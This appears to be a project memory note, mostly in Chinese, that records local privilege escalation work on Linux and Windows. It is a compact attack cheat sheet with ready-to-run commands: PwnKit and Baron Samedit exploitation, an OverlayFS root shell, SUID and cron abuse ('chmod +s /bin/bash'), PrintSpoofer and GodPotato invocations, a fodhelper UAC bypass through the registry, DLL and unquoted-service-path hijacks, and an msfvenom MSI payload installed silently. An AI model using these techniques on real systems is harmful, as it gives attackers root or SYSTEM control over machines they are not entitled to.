---
name: lpe-track-record
description: 本地提权工作轨迹 —— Linux (PwnKit/Baron Samedit/OverlayFS/SUID/cron) + Windows (PrintSpoofer/GodPotato/UAC bypass/DLL hijack/unquoted svc/AlwaysInstallElevated) | LPE track record
metadata:
  type: project
---

## Linux LPE 已交付类别

- **PwnKit (CVE-2021-4034)** — Qualys PoC；`gcc -o exploit exploit.c` + run once；polkit < 0.120 → `dpkg -l policykit-1` 版本查
- **Baron Samedit (CVE-2021-3156)** — Qualys `sudo-hax-me-a-sandwich` PoC；探测：`sudoedit -s '\'` 返回 help 而非 segfault = vulnerable；auto-offset 扫 0-9
- **OverlayFS (CVE-2021-3493)** — Ubuntu-specific；user namespace mount + setuid `/tmp/root_shell` 通过 copy-up；`sysctl -w kernel.unprivileged_userns_clone=1`
- **SUID enum**：`find / -perm -4000 -type f 2>/dev/null` → GTFOBins slug match → `find . -exec /bin/sh -p \;`（`-p` 保 effective UID 关键）
- **cron 世界可写脚本**：脚本追加 `chmod +s /bin/bash` → 等 cycle → `/bin/bash -p` root；离线安全（不依赖出网）
- **LinPEAS pipeline**：ANSI RED/YELLOW 解析器 + GTFOBins slug snapshot cross-ref + exploit-db PoC 索引

## Windows LPE 已交付类别

- **PrintSpoofer** — SeImpersonate on Server 2019 pre-2022-05 CU；`PrintSpoofer64.exe -c cmd -i` → SYSTEM
- **GodPotato** — DCOM RPCSS 滥用；Server 2019/2022/2025 (post-PrintSpoofer patch) 都能用；`GodPotato-NET4.exe -cmd "cmd /c cmd"`
- **fodhelper UAC bypass** — `HKCU\Software\Classes\ms-settings\Shell\Open\command` + empty `DelegateExecute` → `Start-Process fodhelper.exe` → high-integrity；cleanup 删注册表 key
- **DLL search-order hijack** — ProcMon `NAME NOT FOUND` filter → 服务 install dir 世界可写 → drop `dwmapi.dll` payload；`DllMain` 里 `CreateProcess` 不用 `system()`；不要在 `DllMain` 里做太多事
- **unquoted service path** — `wmic service get name,pathname,startmode | findstr /i "auto"` → token boundary 目录可写 → drop `Vuln.exe`；PowerUp 的 `Get-UnquotedService` 自动化
- **AlwaysInstallElevated** — `reg query` HKCU + HKLM 都要 `= 0x1`；`msfvenom -p windows/x64/exec CMD="cmd.exe" -f msi -o payload.msi` + `msiexec /quiet /qn /i`

## Enum 惯例

- Linux 先跑 LinPEAS；Windows 先跑 winPEAS 或 PowerUp
- 关注 RED 级别 findings + GTFOBins/LOLBAS 匹配
- Windows：`whoami /priv` 判断 SeImpersonate → PrintSpoofer/GodPotato 分支

## 工作模式


## 交付形态

`exploit.c` / `exploit.py` + repro notes（target OS 精确版本）；Windows PoC `.exe` + `.ps1` scaffold。

## 相关 memory

- [[vuln-research-track-record]] kernel exploit primitives
- [[pentest-lab-track-record]] 拿到 SYSTEM 后的 lateral
